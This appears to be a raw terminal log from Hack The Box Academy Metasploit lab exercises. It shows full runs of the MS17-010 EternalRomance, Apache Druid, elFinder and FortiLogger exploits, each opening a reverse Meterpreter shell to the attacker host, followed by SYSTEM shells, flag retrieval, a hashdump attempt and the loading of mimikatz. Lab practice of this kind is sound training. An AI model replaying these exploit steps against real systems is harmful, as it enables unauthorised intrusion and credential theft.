@@ -1,0 +1,749 @@
+─(white㉿white)-[~/white/Documents/htb]
+└─$ searchsploit  EternalRomance                  
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                       |  Path
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)            | windows/remote/43970.rb
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ msfconsole -q
+msf > search  EternalRomance
+
+Matching Modules
+================
+
+   #   Name                                  Disclosure Date  Rank    Check  Description
+   -   ----                                  ---------------  ----    -----  -----------
+   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   1     \_ target: Automatic                .                .       .      .
+   2     \_ target: PowerShell               .                .       .      .
+   3     \_ target: Native upload            .                .       .      .
+   4     \_ target: MOF upload               .                .       .      .
+   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
+   6     \_ AKA: ETERNALROMANCE              .                .       .      .
+   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
+   8     \_ AKA: ETERNALBLUE                 .                .       .      .
+   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
+   11    \_ AKA: ETERNALROMANCE              .                .       .      .
+   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
+   13    \_ AKA: ETERNALBLUE                 .                .       .      .
+
+
+Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command
+
+msf > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_psexec) > info
+
+       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+     Module: exploit/windows/smb/ms17_010_psexec
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2017-03-14
+
+Provided by:
+  sleepya
+  zerosum0x0
+  Shadow Brokers
+  Equation Group
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+      1   PowerShell
+      2   Native upload
+      3   MOF upload
+
+Check supported:
+  Yes
+
+Basic options:
+  Name                  Current Setting                                Required  Description
+  ----                  ---------------                                --------  -----------
+  DBGTRACE              false                                          yes       Show extra debug trace info
+  LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
+  NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
+  NAMED_PIPES           /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
+                        s/named_pipes.txt
+  RHOSTS                                                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
+                                                                                 ng-metasploit.html
+  RPORT                 445                                            yes       The Target port (TCP)
+  SERVICE_DESCRIPTION                                                  no        Service description to be used on target for pretty listing
+  SERVICE_DISPLAY_NAME                                                 no        The service display name
+  SERVICE_NAME                                                         no        The service name
+  SHARE                 ADMIN$                                         yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/writ
+                                                                                 e folder share
+  SMBDomain             .                                              no        The Windows domain to use for authentication
+  SMBPass                                                              no        The password for the specified username
+  SMBUser                                                              no        The username to authenticate as
+
+Payload information:
+  Space: 3072
+
+Description:
+  This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
+  primitive. This will then be used to overwrite the connection session information with as an
+  Administrator session. From there, the normal psexec payload code execution is done.
+
+  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
+  Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
+  exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
+  named pipe.
+
+References:
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
+  https://github.com/worawit/MS17-010
+  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
+  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
+  https://attack.mitre.org/techniques/T1021/002/
+  https://attack.mitre.org/techniques/T1059/
+  https://attack.mitre.org/techniques/T1059/001/
+  https://attack.mitre.org/techniques/T1569/002/
+
+Also known as:
+  ETERNALSYNERGY
+  ETERNALROMANCE
+  ETERNALCHAMPION
+  ETERNALBLUE
+
+
+View the full module info with the info -d command.
+
+msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.125.91
+RHOSTS => 10.129.125.91
+msf exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.129.125.91
+RHOSTS => 10.129.125.91
+msf exploit(windows/smb/ms17_010_psexec) > setg LHOSTS 10.10.15.9
+LHOSTS => 10.10.15.9
+msf exploit(windows/smb/ms17_010_psexec) > run
+[*] Started reverse TCP handler on 192.168.1.4:4444 
+[*] 10.129.125.91:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 10.129.125.91:445 - Built a write-what-where primitive...
+[+] 10.129.125.91:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.129.125.91:445 - Selecting PowerShell target
+[*] 10.129.125.91:445 - Executing the payload...
+[+] 10.129.125.91:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.125.91
+RHOSTS => 10.129.125.91
+msf exploit(windows/smb/ms17_010_psexec) > set LHOSTS 10.10.15.9
+[!] Unknown datastore option: LHOSTS. Did you mean RHOSTS?
+LHOSTS => 10.10.15.9
+msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.9
+LHOST => 10.10.15.9
+msf exploit(windows/smb/ms17_010_psexec) > run
+[*] Started reverse TCP handler on 10.10.15.9:4444 
+[*] 10.129.125.91:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 10.129.125.91:445 - Built a write-what-where primitive...
+[+] 10.129.125.91:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.129.125.91:445 - Selecting PowerShell target
+[*] 10.129.125.91:445 - Executing the payload...
+[+] 10.129.125.91:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (199238 bytes) to 10.129.125.91
+[*] Meterpreter session 1 opened (10.10.15.9:4444 -> 10.129.125.91:49672) at 2026-08-03 12:09:31 +0530
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > shell
+Process 3036 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9850-1131
+
+ Directory of C:\Windows\system32
+
+05/16/2022  05:08 AM    <DIR>          .
+05/16/2022  05:08 AM    <DIR>          ..
+11/20/2016  05:36 PM    <DIR>          0409
+he system cannot find the path specified.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9850-1131
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/16/2022  05:17 AM    <DIR>          .
+05/16/2022  05:17 AM    <DIR>          ..
+05/16/2022  04:19 AM                29 flag.txt
+               1 File(s)             29 bytes
+               2 Dir(s)  30,872,334,336 bytes free
+
+C:\Users\Administrator\Desktop>cat flag.txt
+cat flag.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator\Desktop>flag.txt
+flag.txt
+
+C:\Users\Administrator\Desktop>type flag.txt   
+type flag.txt   
+HTB{MSF-W1nD0w5-3xPL01t4t10n}
+C:\Users\Administrator\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::b5e8:cb8a:bb15:1c42
+   Link-local IPv6 Address . . . . . : fe80::b5e8:cb8a:bb15:1c42%6
+   IPv4 Address. . . . . . . . . . . : 10.129.125.91
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe8a:3910%6
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+
+C:\Users\Administrator\Desktop>getuid
+getuid
+'getuid' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator\Desktop>
+#######################################################
+Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
+##########################################################
+msf > search apache druid
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
+   1    \_ target: Linux (dropper)                    .                .          .      .
+   2    \_ target: Unix (in-memory)                   .                .          .      .
+   3  exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
+   4    \_ target: Automatic                          .                .          .      .
+   5    \_ target: Windows                            .                .          .      .
+   6    \_ target: Linux                              .                .          .      .
+   7  auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
+   8    \_ AKA: Log4Shell                             .                .          .      .
+   9    \_ AKA: LogJam                                .                .          .      .
+
+
+Interact with a module by name or index. For example info 9, use 9 or use auxiliary/scanner/http/log4shell_scanner
+
+msf > use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf exploit(linux/http/apache_druid_js_rce) > show options
+
+Module options (exploit/linux/http/apache_druid_js_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   RHOSTS     10.129.125.91    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      8888             yes       The target port (TCP)
+   SRVHOST                     no        The local host to listen on and use for incoming connections
+   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The base path of Apache Druid
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVPORT  8080             yes       The local port to listen on
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux (dropper)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/http/apache_druid_js_rce) > set RHOST 10.129.203.52
+RHOST => 10.129.203.52
+msf exploit(linux/http/apache_druid_js_rce) > set RHOSTS 10.129.203.52
+RHOSTS => 10.129.203.52
+msf exploit(linux/http/apache_druid_js_rce) > set LHOST 10.10.15.9
+LHOST => 10.10.15.9
+msf exploit(linux/http/apache_druid_js_rce) > run
+[*] Started reverse TCP handler on 10.10.15.9:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. The target is vulnerable
+[*] Using URL: http://10.10.15.9:8080/H0yHLjQBdwBE
+[*] Client 10.129.203.52 (curl/7.68.0) requested /H0yHLjQBdwBE
+[*] Sending payload to 10.129.203.52 (curl/7.68.0)
+[*] Sending stage (3090404 bytes) to 10.129.203.52
+[*] Command Stager progress - 100.00% done (115/115 bytes)
+[*] Meterpreter session 2 opened (10.10.15.9:4444 -> 10.129.203.52:32774) at 2026-08-03 12:45:19 +0530
+[*] Server stopped.
+
+meterpreter > shell
+Process 1996 created.
+Channel 1 created.
+ls
+LICENSE
+NOTICE
+README
+bin
+conf
+extensions
+hadoop-dependencies
+lib
+licenses
+quickstart
+var
+cd
+ls
+druid
+druid.sh
+flag.txt
+snap
+cat flag.txt
+HTB{MSF_Expl01t4t10n}
+
+###########################################################
+session 3
+##########################################################
+msf > search elfinder
+
+Matching Modules
+================
+
+   #  Name                                                               Disclosure Date  Rank       Check  Description
+   -  ----                                                               ---------------  ----       -----  -----------
+   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
+   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
+   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
+   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
+   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+
+msf > use 3
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.86.60
+RHOSTS => 10.129.86.60
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set LPORT 10.10.15.9
+LPORT => 10.10.15.9
+msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST, LPORT.
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.15.9
+LHOST => 10.10.15.9
+msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
+[-] Msf::OptionValidateError One or more options failed to validate: LPORT.
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.86.60
+RHOSTS => 10.129.86.60
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.15.9
+LHOST => 10.10.15.9
+msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
+[-] Msf::OptionValidateError One or more options failed to validate: LPORT.
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set LPORT 4444
+LPORT => 4444
+msf exploit(linux/http/elfinder_archive_cmd_injection) > run
+[*] Started reverse TCP handler on 10.10.15.9:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. elFinder running version 2.1.53
+[*] Uploading file OxZNtLl.txt to elFinder
+[+] Text file was successfully uploaded!
+[*] Attempting to create archive hkzjBS.zip
+[+] Archive was successfully created!
+[*] Using URL: http://10.10.15.9:8080/hzjQaL8ZCk5n
+[*] Client 10.129.86.60 (Wget/1.20.3 (linux-gnu)) requested /hzjQaL8ZCk5n
+[*] Sending payload to 10.129.86.60 (Wget/1.20.3 (linux-gnu))
+[*] Command Stager progress -  51.79% done (58/112 bytes)
+[*] Command Stager progress -  71.43% done (80/112 bytes)
+[*] Sending stage (1062760 bytes) to 10.129.86.60
+[+] Deleted OxZNtLl.txt
+[+] Deleted hkzjBS.zip
+[*] Meterpreter session 3 opened (10.10.15.9:4444 -> 10.129.86.60:36702) at 2026-08-03 13:04:59 +0530
+[*] Command Stager progress -  83.04% done (93/112 bytes)
+[*] Command Stager progress - 100.00% done (112/112 bytes)
+[*] Server stopped.
+
+meterpreter > shell
+Process 1325 created.
+Channel 1 created.
+ls
+zi0vmCDG
+ziLOQ1zD
+zix5LW1D
+cd
+ls
+html
+cat html
+cat: html: Is a directory
+cd html
+ls
+Changelog
+LICENSE.md
+README.md
+bower.json
+composer.json
+css
+elfinder.legacy.html
+files
+img
+index.html
+js
+main.default.js
+package.json
+php
+sounds
+whoami
+www-data
+cd
+ls
+html
+cat /root/flag.txt
+cat: /root/flag.txt: Permission denied
+^Z
+Background channel 1? [y/N]  N 
+ls
+html
+sessions -l   
+/bin/sh: 12: sessions: not found
+^C
+Terminate channel 1? [y/N]  HTB{5e55ion5_4r3_sw33t}
+
+Terminate channel 1? [y/N]  
+########################################################
+session 4
+########################################################
+Based on the target ACADEMY-MSF2-WIN02 and the successful exploitation of FortiLogger (as shown in your previous steps where you gained nt authority\system), here is the answer:
+
+Answer: NT AUTHORITY\SYSTEM
+
+msf > search fortilogger
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank    Check  Description
+   -  ----                                                   ---------------  ----    -----  -----------
+   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload
+
+msf > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOSTS 10.129.125.122
+RHOSTS => 10.129.125.122
+msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST 10.10.15.9
+LHOST => 10.10.15.9
+msf exploit(windows/http/fortilogger_arbitrary_fileupload) > exploit
+
+[*] Started reverse TCP handler on 10.10.15.9:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. FortiLogger version 4.4.2.2
+[+] Generate Payload
+[+] Payload has been uploaded
+[*] Executing payload...
+[*] Sending stage (199238 bytes) to 10.129.125.122
+[*] Meterpreter session 2 opened (10.10.15.9:4444 -> 10.129.125.122:49686) at 2026-08-03 13:23:59 +0530
+
+meterpreter > 
+meterpreter > shell
+Process 2820 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>getuid
+getuid
+'getuid' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>whomai
+whomai
+'whomai' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>exit
+meterpreter > hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                     Arch  Session  User                          Path
+ ---   ----  ----                     ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                   x64   0
+ 68    612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 88    4     Registry                 x64   0
+ 264   4     smss.exe                 x64   0
+ 336   540   dwm.exe                  x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 364   612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 372   364   csrss.exe                x64   0
+ 396   612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 472   1376  MusNotification.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\MusNotification.exe
+ 476   364   wininit.exe              x64   0
+ 484   468   csrss.exe                x64   1
+ 540   468   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 612   476   services.exe             x64   0
+ 632   476   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 700   612   svchost.exe              x64   0
+ 712   612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 724   612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 744   612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 764   612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 784   476   fontdrvhost.exe          x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
+ 840   612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 884   612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 936   540   fontdrvhost.exe          x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
+ 1016  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1060  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1180  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1216  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1220  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1232  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1272  612   vm3dservice.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
+ 1336  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1356  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1368  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1376  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1416  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1516  5116  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 1548  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1608  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1616  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1632  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1692  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1728  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1744  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1848  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1948  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1956  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1984  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1992  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2028  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2040  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2096  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2172  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2240  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2312  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2324  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2376  1376  CompatTelRunner.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
+ 2464  612   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2496  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2504  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2544  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2568  612   fortiloggerlistener.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\RZK\Fortilogger\Listener\fortiloggerlistener.exe
+ 2580  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2592  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2604  612   fortiloggerservice.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\RZK\Fortilogger\Service\fortiloggerservice.exe
+ 2620  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2636  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2644  612   mongod.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\MongoDB\Server\4.2\bin\mongod.exe
+ 2652  612   mongod.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\MongoDB\Server\4.2\bin\mongod.exe
+ 2660  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2696  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2712  612   vmtoolsd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 2732  612   VGAuthService.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
+ 2740  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2756  612   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2764  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2856  612   svchost.exe              x64   0
+ 2880  612   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2952  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3080  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3452  612   dllhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
+ 3612  5116  iisexpresstray.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\IIS Express\iisexpresstray.exe
+ 3816  764   WmiPrvSE.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 3896  1140  SIHClient.exe            x64   0
+ 3940  2376  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 3948  5116  svchost.exe              x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Temp\rad72446.tmp\svchost.exe
+ 4024  540   LogonUI.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
+ 4168  612   sppsvc.exe               x64   0
+ 4188  612   msdtc.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 4444  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 4624  764   WmiPrvSE.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
+ 4928  1376  DeviceCensus.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\DeviceCensus.exe
+ 5072  612   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 5116  2604  iisexpress.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\IIS Express\iisexpress.exe
+ 5536  5116  WMIC.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WMIC.exe
+ 5544  5536  conhost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+
+meterpreter > load kiwi   
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
